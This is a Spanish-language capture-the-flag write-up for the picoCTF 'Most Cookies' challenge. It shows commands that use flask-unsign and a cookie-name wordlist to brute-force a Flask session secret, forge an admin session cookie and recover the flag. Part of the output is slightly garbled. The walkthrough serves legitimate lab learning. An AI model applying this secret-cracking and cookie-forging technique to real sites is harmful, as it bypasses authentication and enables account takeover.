### Most Cookies
### Descripcion
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!http://wily-courier.picoctf.net:52166/
### Solucion
- crear un ambiente virtual para intalar flask-unsign

`python -m venv ~/.venv source ~/.venv/bin/activate pip3 install flask-unsign`

- Crakeamos la cookie de flask usando una lista de palabras
```
┌──(.venv)─(kali㉿kali)-[~]
└─$ nano cookies.txt    
                                                                             
┌──(.venv)─(kali㉿kali)-[~]
└─$ cat cookies.txt 
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia

```
```
┌──(.venv)─(kali㉿kali)-[~]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aaiDVQ.pB1ob2XzqFLdWyCJEUA_gSnWhDs" --wordlist cookies.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'macaron'
┌──(.venv)─(kali㉿kali)-[~]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'macaron'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aaiFWA.kPAfK20zo-F5I44y54Fyyog54b4
                                                                   
```
- Con esta cookie nueva que nos dio, se modifica la de la pagina y asi obtenemos la llave.
`picoCTF{cO0ki3s_yum_e45c084f}`
### Notas

### Referencias